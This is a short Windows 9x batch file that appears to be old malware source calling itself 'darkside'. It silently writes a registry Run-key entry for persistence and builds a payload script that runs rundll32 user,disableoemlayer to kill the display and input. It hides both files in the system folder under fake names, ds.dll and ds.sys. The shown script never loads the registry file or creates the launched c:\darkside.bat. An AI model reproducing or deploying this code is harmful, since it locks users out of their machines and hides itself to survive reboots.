@echo off
ctty nul
echo REGEDIT4>dsreg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>dsreg
echo "darkside"="c:\\darkside.bat">>dsreg
move dsreg %winbootdir%\system\ds.dll
echo :: time to panic now>darkside
echo :: ...>>darkside
echo :: darkside soul injected>>darkside
echo.>>darkside
echo @echo off>>darkside
echo ctty nul>>darkside
echo c:\windows\rundll32.exe user,disableoemlayer>>darkside
move darkside %winbootdir%\system\ds.sys
:end